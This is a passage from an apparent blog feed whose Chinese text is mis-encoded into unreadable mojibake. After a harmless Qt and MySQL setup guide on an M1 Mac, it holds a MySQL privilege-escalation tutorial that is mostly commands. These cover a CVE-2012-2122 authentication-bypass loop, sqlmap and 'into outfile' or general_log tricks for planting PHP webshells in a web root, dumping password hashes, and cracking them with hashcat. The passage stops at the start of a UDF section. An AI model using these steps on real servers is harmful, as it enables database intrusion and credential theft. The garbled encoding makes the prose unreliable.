class="hljs-regexp">/6.2.3_1/</span>bin/qmake<br></code></pre></td></tr></table></figure><p><img src="/../images/e6c9d24egy1h1ucgvl5bhj21f70u0dk0.png" alt="4"></p><h3 id="é…ç½®Debuggers"><a href="#é…ç½®Debuggers" class="headerlink" title="é…ç½®Debuggers"></a>é…ç½®Debuggers</h3><p>ä¸€èˆ¬æœ‰é»˜è®¤è‡ªåŠ¨æ£€æµ‹åˆ°çš„LLDBï¼Œå¦‚æœæ²¡æœ‰å°±æ·»åŠ æˆ‘å›¾ç¤ºä¸­Xcodeä¸‹çš„LLDB(è¦å…ˆè£…Xcode)</p><p>è·¯å¾„ï¼š<code>/Applications/Xcode.app/Contents/Developer/usr/bin/lldb</code></p><p><img src="/../images/e6c9d24egy1h1ucjcdt7hj21dx0u00vy.png" alt="5"></p><h3 id="è¿”å›åˆ°Kitsé€‰æ‹©åˆšåˆšé…ç½®å¥½çš„ç‰ˆæœ¬"><a href="#è¿”å›åˆ°Kitsé€‰æ‹©åˆšåˆšé…ç½®å¥½çš„ç‰ˆæœ¬" class="headerlink" title="è¿”å›åˆ°Kitsé€‰æ‹©åˆšåˆšé…ç½®å¥½çš„ç‰ˆæœ¬"></a>è¿”å›åˆ°Kitsé€‰æ‹©åˆšåˆšé…ç½®å¥½çš„ç‰ˆæœ¬</h3><p>ä¸€èˆ¬æƒ…å†µä¸‹è¿™é‡Œçš„ç¼–è¯‘å™¨(Compiler)éƒ½ä¼šè‡ªåŠ¨æ£€æµ‹åˆ°æœ¬æœºæ‰€å¸¦ç¯å¢ƒï¼Œä¸ç”¨æ›´æ”¹</p><p><img src="/../images/e6c9d24egy1h1uckxzx6bj21n00u0q81.png" alt="6"></p><h3 id="æ–°å»ºä¸€ä¸ªé¡¹ç›®"><a href="#æ–°å»ºä¸€ä¸ªé¡¹ç›®" class="headerlink" title="æ–°å»ºä¸€ä¸ªé¡¹ç›®"></a>æ–°å»ºä¸€ä¸ªé¡¹ç›®</h3><p><img src="/../images/e6c9d24egy1h1ucm7hh0gj21ni0u076u.png" alt="7"></p><h3 id="é€‰æ‹©æ¨¡ç‰ˆ"><a href="#é€‰æ‹©æ¨¡ç‰ˆ" class="headerlink" title="é€‰æ‹©æ¨¡ç‰ˆ"></a>é€‰æ‹©æ¨¡ç‰ˆ</h3><p><img src="/../images/e6c9d24egy1h1ucmnslqlj21c60u0acl.png" alt="8"></p><h3 id="é€‰æ‹©è·¯å¾„-ä¸èƒ½å¸¦ä¸­æ–‡"><a href="#é€‰æ‹©è·¯å¾„-ä¸èƒ½å¸¦ä¸­æ–‡" class="headerlink" title="é€‰æ‹©è·¯å¾„(ä¸èƒ½å¸¦ä¸­æ–‡)"></a>é€‰æ‹©è·¯å¾„(ä¸èƒ½å¸¦ä¸­æ–‡)</h3><p><img src="/../images/e6c9d24egy1h1ucnji2ynj218g0tcwgp.png" alt="9"></p><h3 id="é€‰æ‹©qmake"><a href="#é€‰æ‹©qmake" class="headerlink" title="é€‰æ‹©qmake"></a>é€‰æ‹©qmake</h3><p><img src="/../images/e6c9d24egy1h1uco09mb9j218g0tcgn0.png" alt="10"></p><h3 id="å‰©ä¸‹ä¸€ç›´éƒ½ç‚¹ç»§ç»­ï¼Œç›´åˆ°Kits-é€‰æ‹©åˆšåˆšé…ç½®çš„"><a href="#å‰©ä¸‹ä¸€ç›´éƒ½ç‚¹ç»§ç»­ï¼Œç›´åˆ°Kits-é€‰æ‹©åˆšåˆšé…ç½®çš„" class="headerlink" title="å‰©ä¸‹ä¸€ç›´éƒ½ç‚¹ç»§ç»­ï¼Œç›´åˆ°Kits,é€‰æ‹©åˆšåˆšé…ç½®çš„"></a>å‰©ä¸‹ä¸€ç›´éƒ½ç‚¹ç»§ç»­ï¼Œç›´åˆ°Kits,é€‰æ‹©åˆšåˆšé…ç½®çš„</h3><p><img src="/../images/e6c9d24egy1h1ucp7tqxcj218g0tc76c.png" alt="11"></p><h3 id="æ„å»ºé¡¹ç›®"><a href="#æ„å»ºé¡¹ç›®" class="headerlink" title="æ„å»ºé¡¹ç›®"></a>æ„å»ºé¡¹ç›®</h3><p><img src="/../images/e6c9d24egy1h1ucpqyve4j218g0tcjtd.png" alt="12"></p><h3 id="è¿è¡Œé¡¹ç›®ï¼Œä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªé»˜è®¤çš„ç©ºç™½æ¡†"><a href="#è¿è¡Œé¡¹ç›®ï¼Œä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªé»˜è®¤çš„ç©ºç™½æ¡†" class="headerlink" title="è¿è¡Œé¡¹ç›®ï¼Œä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªé»˜è®¤çš„ç©ºç™½æ¡†"></a>è¿è¡Œé¡¹ç›®ï¼Œä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªé»˜è®¤çš„ç©ºç™½æ¡†</h3><p><img src="/../images/e6c9d24egy1h1ucr1dk8zj20tg0gqdgs.png" alt="."></p><p><img src="/../images/e6c9d24egy1h1ucrjmkltj20zu0si750.png" alt="."></p><blockquote><p>å…·ä½“çš„ä½¿ç”¨å¯ä»¥å»bç«™æœqtæ•™ç¨‹</p></blockquote><h2 id="Qtæ­é…mysql"><a href="#Qtæ­é…mysql" class="headerlink" title="Qtæ­é…mysql"></a>Qtæ­é…mysql</h2><h3 id="åŠ¨æ€é“¾æ¥åº“ä¸‹è½½"><a href="#åŠ¨æ€é“¾æ¥åº“ä¸‹è½½" class="headerlink" title="åŠ¨æ€é“¾æ¥åº“ä¸‹è½½"></a>åŠ¨æ€é“¾æ¥åº“ä¸‹è½½</h3><p>è‹¥è¦æ­é…mysqlå†™é¡¹ç›®ï¼Œéœ€è¦æ·»åŠ åŠ¨æ€é“¾æ¥åº“<code>libqsqlmysql.dylib</code>ï¼Œç½‘ä¸Šå¤§éƒ¨åˆ†æ•™ç¨‹éƒ½æ˜¯ä¸‹è½½qtæºç è¿›è¡Œç¼–è¯‘ï¼Œä½†ç”±äºM1æ˜¯arm64æ¶æ„ï¼Œç¼–è¯‘çš„è¿‡ç¨‹ä¼šæœ‰å¾ˆå¤šæŠ¥é”™ä»¥åŠè·¯å¾„ä¸å¯¹çš„é—®é¢˜ï¼Œç½‘ä¸Šèƒ½ä¸‹è½½çš„åŠ¨æ€é“¾æ¥åº“ä¹Ÿå¤§å¤šä¸æ˜¯armæ¶æ„çš„ï¼Œå› æ­¤ä¸å¾—ä¸æåˆ°macä¸‹çš„ç¥å™¨<code>homebrew</code>,ç»ˆç«¯æ‰§è¡Œå‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">brew install qt-mysql<br></code></pre></td></tr></table></figure><blockquote><p>brewä¼šè‡ªåŠ¨åŒ¹é…ä¸‹è½½æœ€æ–°qtç‰ˆæœ¬çš„åŠ¨æ€é“¾æ¥åº“ï¼Œå› æ­¤å»ºè®®qtä¹Ÿä½¿ç”¨homebrewå®‰è£…</p></blockquote><p>è¿›å…¥ç›®å½•<code>/opt/homebrew/Cellar/qt-mysql/6.2.3/share/qt/plugins/sqldrivers</code>å°†è¿™ä¸ªåŠ¨æ€é“¾æ¥åº“æ”¾åˆ°<code>/opt/homebrew/Cellar/qt/6.2.3_1/share/qt/plugins/sqldrivers</code>ä¸­</p><p><img src="/../images/e6c9d24ely1h4xfpipwhjj21fg0okgng.png" alt="13"></p><blockquote><p>æ³¨æ„ç‰ˆæœ¬å·å¯¹åº”</p></blockquote><h3 id="å¼•å…¥SQLæ¨¡å—"><a href="#å¼•å…¥SQLæ¨¡å—" class="headerlink" title="å¼•å…¥SQLæ¨¡å—"></a>å¼•å…¥SQLæ¨¡å—</h3><p>åœ¨é¡¹ç›®çš„.proæ–‡ä»¶çš„é¦–è¡ŒåŠ ä¸Šsql</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp">QT       += core gui sql <span class="hljs-comment">//ä¿®æ”¹å¤„</span><br><br><span class="hljs-built_in">greaterThan</span>(QT_MAJOR_VERSION, <span class="hljs-number">4</span>): QT += widgets<br><br>CONFIG += c++<span class="hljs-number">17</span><br><br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><h3 id="è¿æ¥mysqlæ•°æ®åº“"><a href="#è¿æ¥mysqlæ•°æ®åº“" class="headerlink" title="è¿æ¥mysqlæ•°æ®åº“"></a>è¿æ¥mysqlæ•°æ®åº“</h3><p>è¿›å…¥qté¡¹ç›®æ‰§è¡Œä»¥ä¸‹ä»£ç æ‰“å°æ•°æ®åº“é©±åŠ¨</p><p>mainwindow.cpp</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mainwindow.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;ui_mainwindow.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;QSqlDatabase&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;QDebug&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;QMessageBox&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;QSqlError&gt;</span></span><br><span class="hljs-comment">//...</span><br><span class="hljs-built_in">qDebug</span>()&lt;&lt;QSqlDatabase::<span class="hljs-built_in">drivers</span>();<span class="hljs-comment">//æŸ¥çœ‹å½“å‰å¯ç”¨é©±åŠ¨</span><br></code></pre></td></tr></table></figure><blockquote><p>å¯ç”¨é©±åŠ¨ä¸­æœ‰QMYSQLå³ä¸ºæˆåŠŸ</p><p><img src="/../images/e6c9d24ely1h4xg0zi3z4j20gk02yglv.png" alt="."></p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp">QSqlDatabase db=QSqlDatabase::<span class="hljs-built_in">addDatabase</span>(<span class="hljs-string">&quot;QMYSQL&quot;</span>);<span class="hljs-comment">//æ·»åŠ ä¸€ä¸ªæ•°æ®åº“</span><br>db.<span class="hljs-built_in">setHostName</span>(<span class="hljs-string">&quot;127.0.0.1&quot;</span>);<span class="hljs-comment">//è®¾ç½®ä¸»æœºip</span><br>db.<span class="hljs-built_in">setUserName</span>(<span class="hljs-string">&quot;username&quot;</span>);<span class="hljs-comment">//mysqlæ•°æ®åº“ç”¨æˆ·å</span><br>db.<span class="hljs-built_in">setPassword</span>(<span class="hljs-string">&quot;password&quot;</span>);<span class="hljs-comment">//å¯†ç </span><br>db.<span class="hljs-built_in">setDatabaseName</span>(<span class="hljs-string">&quot;db&quot;</span>);<span class="hljs-comment">//è¿æ¥çš„æ•°æ®åº“å</span><br><span class="hljs-keyword">if</span>(db.<span class="hljs-built_in">open</span>()==<span class="hljs-literal">false</span>)&#123;<span class="hljs-comment">//æ‰“å¼€å¤±è´¥çš„è­¦å‘Š</span><br>    QMessageBox::<span class="hljs-built_in">warning</span>(<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;waring&quot;</span>,db.<span class="hljs-built_in">lastError</span>().<span class="hljs-built_in">text</span>());<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>è¿è¡Œé¡¹ç›®åªè¦æ²¡æœ‰è­¦å‘Šæ¡†å¼¹å‡ºå°±è¯´æ˜è¿æ¥æ•°æ®åº“æˆåŠŸ</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ç¯å¢ƒæ­å»º </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mac </tag>
            
            <tag> qt </tag>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysqlææƒ</title>
      <link href="/2022/07/08/Mysql%E6%8F%90%E6%9D%83/"/>
      <url>/2022/07/08/Mysql%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h1 id="Mysqlææƒ"><a href="#Mysqlææƒ" class="headerlink" title="Mysqlææƒ"></a>Mysqlææƒ</h1><h2 id="å‰ææ¡ä»¶"><a href="#å‰ææ¡ä»¶" class="headerlink" title="å‰ææ¡ä»¶"></a>å‰ææ¡ä»¶</h2><ol><li><strong>å…·æœ‰MySQLçš„rootæƒé™ï¼Œä¸”MySQLä»¥systemæƒé™è¿è¡Œã€‚</strong></li><li><strong>å…·æœ‰æ‰§è¡ŒSQLè¯­å¥çš„æƒé™ã€‚</strong></li></ol><p><strong>è·å–rootå¯†ç çš„æ–¹æ³•ï¼š</strong></p><ol><li><p>MySQL 3306 ç«¯å£å¼±å£ä»¤çˆ†ç ´</p></li><li><p>sqlmap æ³¨å…¥çš„ <code>--sql-shell</code> æ¨¡å¼</p><blockquote><p>ä½¿ç”¨æ¡ä»¶:æ•°æ®åº“å¼€å¯äº†shellèƒ½æ‰§è¡Œå‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u www.xxxx/aboutus.php?<span class="hljs-built_in">id</span>=1 --sql-shell<br></code></pre></td></tr></table></figure><p>è¿›å…¥äº†äº¤äº’å¼é¡µé¢ï¼Œè¾“å…¥ select host,user,password from mysql.userè¿™æ¡å‘½ä»¤ï¼Œå¯ä»¥æŸ¥è¯¢æ•°æ®åº“çš„ç”¨æˆ·å’Œå¯†ç </p></blockquote></li><li><p>ç½‘ç«™çš„æ•°æ®åº“é…ç½®æ–‡ä»¶ä¸­æ‹¿åˆ°æ˜æ–‡å¯†ç ä¿¡æ¯</p></li><li><p>CVE-2012-2122 ç­‰è¿™ç±»æ¼æ´ç›´æ¥æ‹¿ä¸‹ MySQL æƒé™</p><blockquote><p>Mysql èº«ä»½è®¤è¯ç»•è¿‡æ¼æ´ï¼ˆCVE-2012-2122ï¼‰,å½“è¿æ¥MariaDB&#x2F;MySQLæ—¶ï¼Œè¾“å…¥çš„å¯†ç ä¼šä¸æœŸæœ›çš„æ­£ç¡®å¯†ç æ¯”è¾ƒï¼Œç”±äºä¸æ­£ç¡®çš„å¤„ç†ï¼Œä¼šå¯¼è‡´å³ä¾¿æ˜¯memcmp()è¿”å›ä¸€ä¸ªéé›¶å€¼ï¼Œä¹Ÿä¼šä½¿MySQLè®¤ä¸ºä¸¤ä¸ªå¯†ç æ˜¯ç›¸åŒçš„ã€‚ä¹Ÿå°±æ˜¯è¯´<u>åªè¦çŸ¥é“ç”¨æˆ·å</u>ï¼Œä¸æ–­å°è¯•å°±èƒ½å¤Ÿç›´æ¥ç™»å…¥SQLæ•°æ®åº“ã€‚å®˜æ–¹è¯´æ³•æ˜¯256æ¬¡ä¼šæˆåŠŸä¸€æ¬¡</p><p>payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> `<span class="hljs-built_in">seq</span> 1 1000`; <span class="hljs-keyword">do</span> mysql -uroot -pwrong -h your-ip -P3306 ; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure></blockquote></li></ol><h2 id="Webshellæƒé™"><a href="#Webshellæƒé™" class="headerlink" title="Webshellæƒé™"></a>Webshellæƒé™</h2><h3 id="into-oufile-å†™-shell"><a href="#into-oufile-å†™-shell" class="headerlink" title="into oufile å†™ shell"></a>into oufile å†™ shell</h3><h4 id="å†™shellæ¡ä»¶"><a href="#å†™shellæ¡ä»¶" class="headerlink" title="å†™shellæ¡ä»¶"></a>å†™shellæ¡ä»¶</h4><ul><li>çŸ¥é“ç½‘ç«™ç‰©ç†è·¯å¾„</li><li>é«˜æƒé™æ•°æ®åº“ç”¨æˆ·</li><li>load_file() å¼€å¯ å³ secure_file_priv æ— é™åˆ¶</li><li>ç½‘ç«™è·¯å¾„æœ‰å†™å…¥æƒé™</li></ul><p>é¦–å…ˆåŸºç¡€è¯­æ³•æŸ¥è¯¢æ˜¯å¦ secure_file_priv æ²¡æœ‰é™åˆ¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; show global variables like <span class="hljs-string">&#x27;%secure_file_priv%&#x27;</span>;<br>+------------------+-------+<br>| Variable_name    | Value |<br>+------------------+-------+<br>| secure_file_priv |       |<br>+------------------+-------+<br></code></pre></td></tr></table></figure><blockquote><p>ä¸åŒvalueå€¼å¯¹åº”</p><table><thead><tr><th align="left">Value</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left">NULL</td><td align="left">ä¸å…è®¸å¯¼å…¥æˆ–å¯¼å‡º</td></tr><tr><td align="left">&#x2F;tmp</td><td align="left">åªå…è®¸åœ¨ &#x2F;tmp ç›®å½•å¯¼å…¥å¯¼å‡º</td></tr><tr><td align="left">ç©º</td><td align="left">ä¸é™åˆ¶ç›®å½•</td></tr></tbody></table><p>åœ¨ MySQL 5.5 ä¹‹å‰ secure_file_priv é»˜è®¤æ˜¯ç©ºï¼Œè¿™ä¸ªæƒ…å†µä¸‹å¯ä»¥<u>å‘ä»»æ„ç»å¯¹è·¯å¾„å†™æ–‡ä»¶</u></p><p>åœ¨ MySQL 5.5ä¹‹å secure_file_priv é»˜è®¤æ˜¯ NULLï¼Œè¿™ä¸ªæƒ…å†µä¸‹ä¸å¯ä»¥å†™æ–‡ä»¶</p></blockquote><p>è‹¥valueä¸ºç©ºï¼Œå³ä¸é™åˆ¶ç›®å½•æ—¶ï¼Œå¯ä»¥ä½¿ç”¨åŸç”ŸSQLè¯­å¥æ¥å†™shell</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span> <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;/var/www/html/info.php&#x27;</span>;<br></code></pre></td></tr></table></figure><p>sqlmapä¸­åšæ³•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://x.x.x.x/?id=x&quot;</span> --file-write=<span class="hljs-string">&quot;/Users/guang/Desktop/shell.php&quot;</span> --file-dest=<span class="hljs-string">&quot;/var/www/html/test/shell.php&quot;</span><br></code></pre></td></tr></table></figure><h3 id="æ—¥å¿—æ–‡ä»¶å†™shell"><a href="#æ—¥å¿—æ–‡ä»¶å†™shell" class="headerlink" title="æ—¥å¿—æ–‡ä»¶å†™shell"></a>æ—¥å¿—æ–‡ä»¶å†™shell</h3><ul><li>Web æ–‡ä»¶å¤¹å®½æ¾æƒé™å¯ä»¥å†™å…¥</li><li>Windows ç³»ç»Ÿä¸‹</li><li>é«˜æƒé™è¿è¡Œ MySQL æˆ–è€… Apache</li></ul><p>MySQL 5.0 ç‰ˆæœ¬ä»¥ä¸Šä¼šåˆ›å»ºæ—¥å¿—æ–‡ä»¶ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹æ—¥å¿—çš„å…¨å±€å˜é‡æ¥ getshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; SHOW VARIABLES LIKE <span class="hljs-string">&#x27;general%&#x27;</span>;<br>+------------------+---------------------------------+<br>| Variable_name    | Value                           |<br>+------------------+---------------------------------+<br>| general_log      | OFF                             |<br>| general_log_file | /var/lib/mysql/c1595d3a029a.<span class="hljs-built_in">log</span> |<br>+------------------+---------------------------------+<br></code></pre></td></tr></table></figure><p><code>general_log</code> é»˜è®¤å…³é—­ï¼Œå¼€å¯å®ƒå¯ä»¥è®°å½•ç”¨æˆ·è¾“å…¥çš„æ¯æ¡å‘½ä»¤ï¼Œä¼šæŠŠå…¶ä¿å­˜åœ¨å¯¹åº”çš„æ—¥å¿—æ–‡ä»¶ä¸­ã€‚</p><p>å¯ä»¥å°è¯•è‡ªå®šä¹‰æ—¥å¿—æ–‡ä»¶ï¼Œå¹¶å‘æ—¥å¿—æ–‡ä»¶é‡Œé¢å†™å…¥å†…å®¹çš„è¯ï¼Œé‚£ä¹ˆå°±å¯ä»¥æˆåŠŸ getshellï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æ›´æ”¹æ—¥å¿—æ–‡ä»¶ä½ç½®</span><br><span class="hljs-built_in">set</span> global general_log = <span class="hljs-string">&quot;ON&quot;</span>;<br><span class="hljs-built_in">set</span> global general_log_file=<span class="hljs-string">&#x27;/var/www/html/info.php&#x27;</span>;<br><br><span class="hljs-comment"># æŸ¥çœ‹å½“å‰é…ç½®</span><br>mysql&gt; SHOW VARIABLES LIKE <span class="hljs-string">&#x27;general%&#x27;</span>;<br>+------------------+-----------------------------+<br>| Variable_name    | Value                       |<br>+------------------+-----------------------------+<br>| general_log      | ON                          |<br>| general_log_file | /var/www/html/info.php |<br>+------------------+-----------------------------+<br><br><span class="hljs-comment"># å¾€æ—¥å¿—é‡Œé¢å†™å…¥ payload</span><br>select <span class="hljs-string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>;<br><br><span class="hljs-comment"># æ­¤æ—¶å·²ç»å†™åˆ° info.php æ–‡ä»¶å½“ä¸­äº†</span><br>root@c1595d3a029a:/var/www/html/$ <span class="hljs-built_in">cat</span> info.php <br>/usr/sbin/mysqld, Version: 5.5.61-0ubuntu0.14.04.1 ((Ubuntu)). started with:<br>Tcp port: 3306  Unix socket: /var/run/mysqld/mysqld.sock<br>Time                 Id Command    Argument<br>201031 21:14:46       40 Query    SHOW VARIABLES LIKE <span class="hljs-string">&#x27;general%&#x27;</span><br>201031 21:15:34       40 Query    select <span class="hljs-string">&#x27;&lt;?php phpinfo();?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œè™½ç„¶å¯ä»¥æˆåŠŸå†™å…¥ï¼Œä½†æ˜¯è¿™ä¸ª info.php æ˜¯ MySQL åˆ›å»ºçš„ ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">-rw-rw---- 1 mysql mysql 293 Oct 31 21:15 info.php<br></code></pre></td></tr></table></figure><p>Apache è®¿é—®è¿™ä¸ª php æ–‡ä»¶ä¼šå‡ºç° HTTP 500 çš„çŠ¶æ€ç ï¼Œç»“è®ºæ˜¯ root ç³»ç»Ÿè¿™ç§æƒ…å†µåŸºæœ¬ä¸Šä¸ä¼šæˆåŠŸï¼Œåªæœ‰åœ¨ Windows ç³»ç»Ÿä¸‹æˆåŠŸç‡ä¼šé«˜ä¸€äº›ï¼Œä¸è¿‡è¿™é‡Œè¿˜æ˜¯å¯ä»¥å½“åšå°çŸ¥è¯†ç‚¹æ¥å­¦ä¹ è®°å½•ã€‚</p><h2 id="Hash-è·å–ä¸è§£å¯†"><a href="#Hash-è·å–ä¸è§£å¯†" class="headerlink" title="Hash è·å–ä¸è§£å¯†"></a>Hash è·å–ä¸è§£å¯†</h2><h3 id="è·å–"><a href="#è·å–" class="headerlink" title="è·å–"></a>è·å–</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># MySQL &lt;= 5.6 ç‰ˆæœ¬</span><br>mysql&gt; select host, user, password from mysql.user;<br><br><span class="hljs-comment"># MySQL &gt;= 5.7 ç‰ˆæœ¬</span><br>mysql&gt; select host,user,authentication_string from mysql.user;<br></code></pre></td></tr></table></figure><h3 id="è§£å¯†"><a href="#è§£å¯†" class="headerlink" title="è§£å¯†"></a>è§£å¯†</h3><p>åœ¨çº¿ç½‘ç«™æ¥è§£å¯†ï¼Œå¦‚å›½å†…çš„ CMD5</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h21dwwaf21j214808y3ze.jpg" alt="img"></p><p>ä¹Ÿå¯ä»¥é€šè¿‡ Hashcat æ¥æ‰‹åŠ¨è·‘å­—å…¸ï¼ŒåŸºæœ¬ä¸Šä½¿ç”¨ GPU ç ´è§£çš„è¯ä¹Ÿæ˜¯å¯ä»¥ç§’ç ´è§£çš„ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hashcat -a 0 -m 300 --force <span class="hljs-string">&#x27;8232A1298A49F710DBEE0B330C42EEC825D4190A&#x27;</span> password.txt -O<br></code></pre></td></tr></table></figure><p><strong>-a ç ´è§£æ¨¡å¼</strong></p><p>æŒ‡å®šè¦ä½¿ç”¨çš„ç ´è§£æ¨¡å¼ï¼Œå…¶å€¼å‚è€ƒåé¢å¯¹å‚æ•°</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs r"><span class="hljs-operator">-</span> <span class="hljs-punctuation">[</span> Attack Modes <span class="hljs-punctuation">]</span> <span class="hljs-operator">-</span><br><br>  <span class="hljs-comment"># | Mode</span><br> <span class="hljs-operator">==</span><span class="hljs-operator">=</span><span class="hljs-operator">+</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><br>  <span class="hljs-number">0</span> <span class="hljs-operator">|</span> Straight                <span class="hljs-comment"># ç›´æ¥å­—å…¸ç ´è§£</span><br>  <span class="hljs-number">1</span> <span class="hljs-operator">|</span> Combination             <span class="hljs-comment"># ç»„åˆç ´è§£</span><br>  <span class="hljs-number">3</span> <span class="hljs-operator">|</span> Brute<span class="hljs-operator">-</span>force             <span class="hljs-comment"># æ©ç æš´åŠ›ç ´è§£</span><br>  <span class="hljs-number">6</span> <span class="hljs-operator">|</span> Hybrid Wordlist <span class="hljs-operator">+</span> Mask  <span class="hljs-comment"># å­—å…¸+æ©ç ç ´è§£</span><br>  <span class="hljs-number">7</span> <span class="hljs-operator">|</span> Hybrid Mask <span class="hljs-operator">+</span> Wordlist  <span class="hljs-comment"># æ©ç +å­—å…¸ç ´è§£</span><br></code></pre></td></tr></table></figure><p><strong>-m ç ´è§£hashç±»å‹</strong></p><p>æŒ‡å®šè¦ç ´è§£çš„hashç±»å‹ï¼Œåé¢è·Ÿhashç±»å‹å¯¹åº”çš„æ•°å­—ï¼Œå…·ä½“ç±»å‹è¯¦è§ä¸‹è¡¨ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">12   | PostgreSQL                                       | Database Server<br>131  | MSSQL (2000)                                     | Database Server<br>132  | MSSQL (2005)                                     | Database Server<br>1731 | MSSQL (2012, 2014)                               | Database Server<br>200  | MySQL323                                         | Database Server<br>300  | MySQL4.1/MySQL5                                  | Database Server<br>...<br></code></pre></td></tr></table></figure><p><strong>â€“force</strong></p><p>å¿½ç•¥ç ´è§£è¿‡ç¨‹ä¸­çš„è­¦å‘Šä¿¡æ¯</p><p><strong>-O</strong></p><p><code>--optimized-kernel-enable</code> å¯ç”¨ä¼˜åŒ–çš„å†…æ ¸ï¼ˆé™åˆ¶å¯†ç é•¿åº¦</p><h2 id="UDFææƒ"><a href="#UDFææƒ" class="headerlink" title="UDFææƒ"></a>UDFææƒ</h2><p>ç”¨æˆ·é€šè¿‡è‡ªå®šä¹‰å‡½æ•°ï¼Œä½¿å¾—åœ¨SQLè¯­å¥ä¸­è°ƒç”¨æ–°å‡½æ•°</p><h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 